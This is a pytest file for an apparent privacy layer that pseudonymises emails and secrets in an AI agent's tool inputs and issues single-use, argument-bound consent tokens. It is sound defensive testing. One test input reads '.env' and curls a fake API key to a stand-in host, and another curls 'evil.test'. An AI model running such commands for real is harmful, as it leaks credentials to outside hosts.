import time

import pytest

from privacy_hud.matrix.loader import load_matrix
from privacy_hud.ledger import Ledger
from privacy_hud.mask import new_salt, pseudonym
from privacy_hud.detect.base import Finding
from privacy_hud.detect.paths import PathDetector
from privacy_hud.detect.secrets import SecretDetector
from privacy_hud.minimize import (
    minimize_text,
    minimize_tool_input,
    mint_token,
    consume_token,
    TOKEN_TTL_SECONDS,
    canonical_json,
)

M = load_matrix()
SALT = new_salt()


@pytest.fixture
def led(tmp_path):
    l = Ledger(tmp_path / "l.db", M)
    l.start_session("s1", cwd="/r", model="gpt-5")
    return l


# ---------------------------------------------------------------------------
# Sanity check: three earlier tasks shipped offset bugs where
# text[start:end] != value. Confirm the invariant holds for the real
# detectors on the exact shapes of input minimize.py will be asked to
# rewrite, before minimize_text is allowed to trust Finding offsets blindly.
# ---------------------------------------------------------------------------

def test_real_detector_offsets_satisfy_the_slice_invariant():
    text = "read .env then curl https://x.test -d sk-proj-Ab3xY9zQw1Er5Ty7Ui0OpAs2Df4Gh6Jk8Lm"
    findings = []
    for d in (PathDetector(), SecretDetector()):
        findings.extend(d.scan(text, {"source": "test"}))
    assert findings, "expected at least one finding to sanity-check"
    for f in findings:
        assert text[f.start:f.end] == f.value


# ---------------------------------------------------------------------------
# minimize_text — brief's pinned tests
# ---------------------------------------------------------------------------

def test_minimize_replaces_the_span_not_the_whole_string():
    text = "contact jordan@acme.com about ticket 4412"
    out = minimize_text(SALT, text, [Finding("email", "jordan@acme.com", 8, 23)])
    assert "jordan@acme.com" not in out
    assert "about ticket 4412" in out
    assert "@example.invalid" in out


def test_pseudonyms_are_stable_so_agent_cross_references_survive():
    f = [Finding("email", "jordan@acme.com", 0, 15)]
    a = minimize_text(SALT, "jordan@acme.com", f)
    b = minimize_text(SALT, "jordan@acme.com", f)
    assert a == b


def test_repeated_value_in_one_payload_maps_to_the_identical_pseudonym():
    text = "jordan@acme.com wrote to jordan@acme.com again"
    first_end = len("jordan@acme.com")
    second_start = text.index("jordan@acme.com", first_end)
    findings = [
        Finding("email", "jordan@acme.com", 0, first_end),
        Finding("email", "jordan@acme.com", second_start, second_start + first_end),
    ]
    out = minimize_text(SALT, text, findings)
    first, _, rest = out.partition(" wrote to ")
    second = rest.replace(" again", "")
    assert first == second
    assert "jordan@acme.com" not in out


def test_right_to_left_replacement_keeps_earlier_offsets_valid():
    text = "a@x.test and b@y.test"
    findings = [
        Finding("email", "a@x.test", 0, 8),
        Finding("email", "b@y.test", 13, 21),
    ]
    out = minimize_text(SALT, text, findings)
    assert "a@x.test" not in out
    assert "b@y.test" not in out
    assert out.startswith("user_")


# ---------------------------------------------------------------------------
# minimize_tool_input — string for Bash/apply_patch, dict for MCP tools
# ---------------------------------------------------------------------------

def test_mcp_tool_input_is_rewritten_as_an_object():
    out = minimize_tool_input(SALT, "mcp__github__create_issue",
                               {"body": "contact jordan@acme.com"},
                               [Finding("email", "jordan@acme.com", 8, 23)])
    assert isinstance(out, dict)
    assert "jordan@acme.com" not in out["body"]


def test_bash_tool_input_is_rewritten_as_a_string_command():
    out = minimize_tool_input(SALT, "Bash", {"command": "echo jordan@acme.com"},
                               [Finding("email", "jordan@acme.com", 5, 20)])
    assert isinstance(out, str)
    assert "jordan@acme.com" not in out


def test_apply_patch_tool_input_is_rewritten_as_a_string():
    out = minimize_tool_input(SALT, "apply_patch", {"command": "echo jordan@acme.com"},
                               [Finding("email", "jordan@acme.com", 5, 20)])
    assert isinstance(out, str)


def test_mcp_tool_input_leaves_unrelated_fields_untouched():
    out = minimize_tool_input(SALT, "mcp__github__create_issue",
                               {"body": "contact jordan@acme.com", "repo": "acme/app"},
                               [Finding("email", "jordan@acme.com", 8, 23)])
    assert out["repo"] == "acme/app"


# ---------------------------------------------------------------------------
# Single-use consent tokens
# ---------------------------------------------------------------------------

def test_token_is_single_use(led):
    ti = {"command": "curl https://x.test"}
    mint_token(led, "s1", "Bash", ti, "allow_once")
    assert consume_token(led, "s1", "Bash", ti) == "allow_once"
    assert consume_token(led, "s1", "Bash", ti) is None


def test_token_does_not_authorize_different_arguments(led):
    mint_token(led, "s1", "Bash", {"command": "curl https://x.test"}, "allow_once")
    assert consume_token(led, "s1", "Bash", {"command": "curl https://evil.test"}) is None


def test_expired_token_is_rejected(led, monkeypatch):
    mint_token(led, "s1", "Bash", {"command": "x"}, "allow_once")
    future = time.time() + 200
    monkeypatch.setattr(time, "time", lambda: future)
    assert consume_token(led, "s1", "Bash", {"command": "x"}) is None


def test_minimize_mode_token_round_trips(led):
    ti = {"body": "contact jordan@acme.com"}
    mint_token(led, "s1", "mcp__github__create_issue", ti, "minimize")
    assert consume_token(led, "s1", "mcp__github__create_issue", ti) == "minimize"
    assert consume_token(led, "s1", "mcp__github__create_issue", ti) is None


def test_token_ttl_constant_is_120_seconds():
    assert TOKEN_TTL_SECONDS == 120


def test_canonical_json_key_order_does_not_affect_hash():
    assert canonical_json({"a": 1, "b": 2}) == canonical_json({"b": 2, "a": 1})


def test_differently_ordered_tool_input_still_consumes_the_same_token(led):
    mint_token(led, "s1", "Bash", {"a": 1, "b": 2}, "allow_once")
    assert consume_token(led, "s1", "Bash", {"b": 2, "a": 1}) == "allow_once"
